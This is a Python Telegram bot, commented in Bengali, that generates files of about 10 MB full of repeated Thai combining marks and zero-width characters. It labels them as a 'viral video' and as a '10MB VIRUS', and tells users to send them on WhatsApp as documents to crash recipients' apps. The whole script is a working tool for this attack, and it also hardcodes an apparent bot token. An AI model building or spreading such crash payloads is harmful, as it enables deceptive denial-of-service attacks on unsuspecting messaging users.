import logging
import sqlite3
import os
import asyncio
import time
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, MessageHandler, filters, ContextTypes

# ১. ক্লিন লগিং
logging.basicConfig(level=logging.WARNING)

# ২. কনফিগারেশন (আপনার টোকেন)
TOKEN = "8675593212:AAG6_m5ZFEqG-qkutygxbuoOetMv9N87TnY"

# ৩. ডাটাবেস সেটআপ
def init_db():
    conn = sqlite3.connect('mr_dev_10mb_pro.db')
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS stats (id INTEGER PRIMARY KEY, count INTEGER)''')
    cursor.execute("INSERT OR IGNORE INTO stats (id, count) VALUES (1, 0)")
    conn.commit()
    conn.close()

# ৪. ১০ এমবি "ভাইরাল ভিডিও" পেলোড জেনারেটর (এক চুলও ছোট না)
async def generate_10mb_payload(status_msg):
    file_name = f"vairal_video_{int(time.time())}.txt"
    
    # অত্যন্ত শক্তিশালী ক্যারেক্টার প্যাটার্ন (১০ এমবি পূর্ণ করতে ক্যালিব্রেটেড)
    crash_pattern = "\u0E47\u0E48\u0E49\u0E4A\u0E4B\u0E4C\u0E4D" * 400 
    invisible_mass = "\u200B\u200C\u200D\uFEFF" * 250
    header = "🎥 VIRAL_VIDEO_DATABASE_PRO_☠️\n"
    
    # একটি ডাটা ব্লক (ঘনত্ব বজায় রেখে)
    deadly_chunk = (header + crash_pattern + invisible_mass + "☣️") * 30
    
    try:
        await status_msg.edit_text("⏳ ১০ এমবি ডেথ-পেলোড তৈরি হচ্ছে...")
        with open(file_name, "w", encoding="utf-8") as f:
            # লুপটি এমনভাবে সেট করা যাতে এটি ঠিক ১০ এমবি বা তার বেশি হয়
            for i in range(1, 101):
                f.write(deadly_chunk)
                if i % 25 == 0:
                    await status_msg.edit_text(f"🚀 প্রসেসিং: {i}% সম্পন্ন...")
        
        await status_msg.edit_text("🔥 ১০০% সম্পন্ন! এখন ইনবক্সে পাঠানো হচ্ছে...")
        return file_name
    except Exception as e:
        print(f"Error: {e}")
        return None

# ৫. মেইন হ্যান্ডলার
async def handle_requests(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message or not update.message.text: return
    text = update.message.text
    user_name = update.effective_user.first_name

    # স্টার্ট মেনু
    if text == "/start":
        keyboard = [[KeyboardButton("🚀 CREATE 10MB VIRUS")], [KeyboardButton("📊 STATUS")]]
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        await update.message.reply_text(
            f"🔥 **M R DEVELOPER 10MB PANEL** 🔥\n\nহ্যালো {user_name}! আমি আপনার ১০ এমবি পেলোড জেনারেট করতে প্রস্তুত।",
            reply_markup=reply_markup
        )

    # ১০ এমবি পেলোড তৈরির বাটন
    elif text == "🚀 CREATE 10MB VIRUS":
        status_msg = await update.message.reply_text("🚀 মিশন শুরু হয়েছে...")
        file_path = await generate_10mb_payload(status_msg)
        
        if file_path and os.path.exists(file_path):
            try:
                # ফাইল পাঠানো (বড় ফাইলের জন্য ৩ মিনিট টাইমআউট)
                with open(file_path, 'rb') as doc:
                    await update.message.reply_document(
                        document=doc, 
                        caption="✅ **10MB VIRUS READY!**\n\nনাম: `vairal_video.txt`\nএটি হোয়াটসঅ্যাপে ডকুমেন্ট হিসেবে পাঠান।",
                        read_timeout=180,
                        write_timeout=180,
                        connect_timeout=180
                    )
                
                # সংখ্যা আপডেট
                conn = sqlite3.connect('mr_dev_10mb_pro.db')
                cur = conn.cursor()
                cur.execute("UPDATE stats SET count = count + 1 WHERE id=1")
                conn.commit()
                conn.close()
            except Exception:
                await update.message.reply_text("❌ ডেলিভারি এরর! নেটওয়ার্ক স্লো। আবার ট্রাই করুন।")
            finally:
                if os.path.exists(file_path): os.remove(file_path)
        await status_msg.delete()

    # স্ট্যাটাস
    elif text == "📊 STATUS":
        conn = sqlite3.connect('mr_dev_10mb_pro.db')
        cur = conn.cursor()
        cur.execute("SELECT count FROM stats WHERE id=1")
        total = cur.fetchone()[0]
        conn.close()
        await update.message.reply_text(f"📊 মোট তৈরি ভাইরাস: {total} টি।")

# ৬. রানার
def main():
    init_db()
    application = Application.builder().token(TOKEN).build()
    application.add_handler(MessageHandler(filters.TEXT, handle_requests))
    
    print("---------------------------------------")
    print("M R DEVELOPER 10MB Bot is Online!")
    print("---------------------------------------")
    
    application.run_polling(drop_pending_updates=True)

if __name__ == '__main__':
    main()
    
